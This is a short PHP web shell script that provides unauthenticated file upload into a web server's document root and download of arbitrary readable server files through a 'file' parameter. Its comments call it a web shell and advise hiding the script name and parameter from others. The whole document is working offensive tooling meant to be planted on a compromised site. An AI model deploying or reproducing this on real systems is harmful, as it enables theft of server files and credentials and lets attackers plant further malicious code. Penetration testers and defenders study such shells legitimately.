<?php
// Copyright (c) 2021 Ivan Šincek
// v2.6
// Requires PHP v4.0.3 or greater because move_uploaded_file() is used.

// modify the script name and request parameter name to random ones to prevent others form accessing and using your web shell
// when downloading a file, you should URL encode the file path

// your parameter/key here
$parameter = 'file';
$output = null;
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post' && isset($_FILES[$parameter]['name']) && ($_FILES[$parameter]['name'] = trim($_FILES[$parameter]['name'])) && strlen($_FILES[$parameter]['name']) > 0) {
    $output = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $_FILES[$parameter]['name'];
    if (@move_uploaded_file($_FILES[$parameter]['tmp_name'], $output) === false) {
        $output = 'ERROR: Cannot upload file.';
    } else {
        $output = "SUCCESS: File was uploaded to '{$output}'";
    }
    unset($_FILES[$parameter]);
}
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'get' && isset($_GET[$parameter]) && ($_GET[$parameter] = trim($_GET[$parameter])) && strlen($_GET[$parameter]) > 0) {
    $output = @file_get_contents($_GET[$parameter]);
    if ($output === false) {
        $output = 'ERROR: Cannot download file';
    } else {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($_GET[$parameter]) . '"');
        echo $output;
        $output = 'download';
    }
    unset($_GET[$parameter]);
}
// if you do not want to use the whole HTML as below, uncomment this line and delete the whole HTML
// garbage collector requires PHP v5.3.0 or greater
// if ($output != 'download') { echo "<pre>{$output}</pre>"; } unset($output);/* @gc_collect_cycles();*/
?>
<?php if ($output != 'download'): ?>
	<!DOCTYPE html>
	<html lang="en">
		<head>
			<meta charset="UTF-8">
			<title>PHP File Upload/Download</title>
			<meta name="author" content="Ivan Šincek">
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
		</head>
		<body>
			<form method="post" enctype="multipart/form-data" action="<?php echo './' . basename($_SERVER['SCRIPT_FILENAME']); ?>">
				<input name="<?php echo $parameter; ?>" type="file" required="required">
				<input type="submit" value="Upload">
			</form>
			<pre><?php echo $output; ?></pre>
		</body>
	</html>
<?php endif; unset($output);/* @gc_collect_cycles();*/ ?>
